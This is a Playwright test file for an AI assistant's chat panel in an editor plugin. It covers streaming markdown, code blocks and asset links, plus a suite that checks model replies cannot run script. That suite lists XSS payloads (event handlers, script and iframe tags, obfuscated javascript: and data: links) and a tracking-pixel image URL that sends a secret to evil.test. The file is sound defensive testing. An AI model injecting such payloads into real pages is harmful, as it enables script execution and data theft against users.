// Assistant text: streaming, markdown, code blocks, asset links, and the rule
// that model output is untrusted. The panel holds the bridge — setapikey,
// installupdate, openinbrowser — so script in a reply is script in the editor.
import { test, expect } from '../support/panel.js';

async function reply(panel, ...chunks) {
	await panel.emit('text_start', {});
	for (const text of chunks) await panel.emit('text_delta', { text });
	await panel.emit('text_end', {});
	return panel.page.locator('#chat .msg-assistant, #chat .msg').last();
}

test.beforeEach(async ({ panel }) => {
	await panel.open();
	await panel.initialState();
});

test('streamed deltas join into one rendered message', async ({ panel }) => {
	const msg = await reply(panel, '## Plan\n', '1. Add a **Box** collision\n', '2. Bind `OnComponentBeginOverlap`');
	await expect(msg.locator('h2')).toHaveText('Plan');
	await expect(msg.locator('li')).toHaveCount(2);
	await expect(msg.locator('code')).toHaveText('OnComponentBeginOverlap');
	await expect(msg.locator('.streaming-cursor')).toHaveCount(0);
});

test('a fenced code block gets a language header and a working Copy button', async ({ panel }) => {
	const msg = await reply(panel, '```cpp\nUE_LOG(LogTemp, Log, TEXT("hi"));\n```');
	await expect(msg.locator('.code-header')).toHaveText('cpp');
	await msg.locator('pre').hover();
	await msg.locator('.copy-btn').click();
	await expect.poll(() => panel.calls('setclipboard')).toEqual([['UE_LOG(LogTemp, Log, TEXT("hi"));\n']]);
});

test('code blocks are syntax highlighted', async ({ panel }) => {
	// KNOWN BUG: marked v5 removed the `highlight` option, so the bundled
	// highlight.js never runs. Remove test.fail() with the fix.
	test.fail(true, 'marked.setOptions({highlight}) is ignored by marked v15');
	const msg = await reply(panel, '```cpp\nint32 Count = 0;\n```');
	await expect(msg.locator('code [class^="hljs-"]').first()).toBeVisible();
});

test('asset paths in prose open the asset; paths in code stay literal', async ({ panel }) => {
	await panel.respond('openasset', true);
	const msg = await reply(panel, 'Open /Game/Blueprints/BP_Door and compare `/Game/Literal/Path`.');
	await msg.getByText('/Game/Blueprints/BP_Door').click();
	await expect.poll(() => panel.calls('openasset')).toEqual([['/Game/Blueprints/BP_Door']]);
	await expect(msg.locator('code')).toHaveText('/Game/Literal/Path');
});

test.describe('model output is untrusted', () => {
	// A reply can quote asset contents, files and web pages, and the page holds
	// the editor bridge. Nothing in it may run, load, or navigate the panel.
	const PAYLOADS = [
		['an inline event handler', '<img src=x onerror="window.__pwned=1">'],
		['an svg onload', '<svg onload="window.__pwned=1"></svg>'],
		['a script tag', '<script>window.__pwned=1</script>'],
		['an iframe', '<iframe srcdoc="<script>parent.__pwned=1</script>"></iframe>'],
		['a raw javascript: anchor', '<a href="javascript:window.__pwned=1">x</a>'],
		['a markdown javascript: link', '[click](javascript:window.__pwned=1)'],
		['a mixed-case javascript: link', '[click](JaVaScRiPt:window.__pwned=1)'],
		['an entity-encoded javascript: link', '[click](&#106;avascript:window.__pwned=1)'],
		['a javascript: autolink', '<javascript:window.__pwned=1>'],
		['a data: link', '[click](data:text/html,<script>parent.__pwned=1</script>)'],
		['a quote-breaking link title', '[click](https://docs.test/a "x\" onmouseover=\"window.__pwned=1")'],
		['a block of raw HTML', '<div onmouseover="window.__pwned=1" style="position:fixed;inset:0">cover</div>\n\ntext'],
	];

	for (const [name, payload] of PAYLOADS) {
		test(`${name} does not run`, async ({ panel }) => {
			const msg = await reply(panel, 'Here you go: ' + payload);
			// Interact the way a user might: hover and click everything clickable.
			for (const el of await msg.locator('a, img, svg, div').all()) {
				await el.hover({ force: true, timeout: 500 }).catch(() => {});
				await el.click({ force: true, timeout: 500 }).catch(() => {});
			}
			await panel.page.waitForTimeout(100);
			expect(await panel.page.evaluate(() => window.__pwned)).toBeUndefined();
			await expect(msg.locator('script, iframe, [onerror], [onload], [onmouseover], [onclick]:not(.copy-btn):not(.asset-link)')).toHaveCount(0);
			await expect(msg.locator('a[href]:not([href^="https://"]):not([href^="http://"]):not([href^="mailto:"])')).toHaveCount(0);
			expect(panel.page.url()).toBe('https://panel.kismet.test/ui.html');
		});
	}

	test('raw HTML is shown as literal text', async ({ panel }) => {
		const msg = await reply(panel, 'Use <b>bold</b> and <br> here.');
		await expect(msg).toContainText('Use <b>bold</b> and <br> here.');
		await expect(msg.locator('b, br')).toHaveCount(0);
	});

	test('an https link opens in the system browser and never navigates the panel', async ({ panel }) => {
		const msg = await reply(panel, 'See [the docs](https://docs.unrealengine.com/x) or https://example.test/y');
		await msg.getByRole('link', { name: 'the docs' }).click();
		await msg.getByRole('link', { name: 'https://example.test/y' }).click();
		await expect.poll(() => panel.calls('openinbrowser')).toEqual([['https://docs.unrealengine.com/x'], ['https://example.test/y']]);
		expect(panel.page.url()).toBe('https://panel.kismet.test/ui.html');
	});

	test('a mailto link is handed to the system', async ({ panel }) => {
		const msg = await reply(panel, '[mail us](mailto:support@example.test)');
		await msg.getByRole('link', { name: 'mail us' }).click();
		await expect.poll(() => panel.calls('openinbrowser')).toEqual([['mailto:support@example.test']]);
	});

	test('a markdown link to an asset opens it in the editor', async ({ panel }) => {
		await panel.respond('openasset', true);
		const msg = await reply(panel, 'Open [the door](/Game/Blueprints/BP_Door).');
		await msg.getByRole('link', { name: 'the door' }).click();
		await expect.poll(() => panel.calls('openasset')).toEqual([['/Game/Blueprints/BP_Door']]);
		expect(await panel.callCount('openinbrowser')).toBe(0);
	});

	test('a relative or unknown-scheme link shows only its label', async ({ panel }) => {
		const msg = await reply(panel, '[local](../secrets.txt) [file](file:///etc/hosts) [ftp](ftp://x.test/)');
		await expect(msg).toContainText('local file ftp');
		await expect(msg.locator('a')).toHaveCount(0);
	});

	test('an asset path inside a URL does not break the link', async ({ panel }) => {
		const msg = await reply(panel, '[guide](https://docs.test/Game/Blueprints/Guide)');
		await expect(msg.getByRole('link', { name: 'guide' })).toHaveAttribute('href', 'https://docs.test/Game/Blueprints/Guide');
		await expect(msg.locator('a')).toHaveCount(1);
	});

	test('a remote image is not fetched; it becomes a link', async ({ panel }) => {
		// The fixture fails the test on any network request, so a fetched image would fail here.
		const msg = await reply(panel, '![tracking pixel](https://evil.test/p.png?d=secret)');
		await expect(msg.locator('img')).toHaveCount(0);
		await expect(msg.getByRole('link', { name: 'tracking pixel' })).toHaveAttribute('href', 'https://evil.test/p.png?d=secret');
	});

	test('an inline data image is shown', async ({ panel }) => {
		const png = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
		const msg = await reply(panel, `![dot](${png})`);
		await expect(msg.locator('img')).toHaveAttribute('src', png);
	});

	test('an svg data image is not shown', async ({ panel }) => {
		const msg = await reply(panel, '![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+)');
		await expect(msg.locator('img, a')).toHaveCount(0);
	});

	test('HTML inside a plan body is shown as text', async ({ panel }) => {
		await panel.emit('plan_ready', { plan: '1. Add a door <img src=x onerror="window.__pwned=1">' });
		await expect(panel.page.locator('#chat')).toContainText('<img src=x');
		await expect(panel.page.locator('#chat img[onerror]')).toHaveCount(0);
		expect(await panel.page.evaluate(() => window.__pwned)).toBeUndefined();
	});

	test('a user message is shown as text', async ({ panel }) => {
		await panel.respond('hasapikey', true);
		await panel.send('<img src=x onerror="window.__pwned=1"> fix it');
		await expect(panel.page.locator('#chat .msg-user').last()).toContainText('<img src=x');
		expect(await panel.page.evaluate(() => window.__pwned)).toBeUndefined();
	});
});
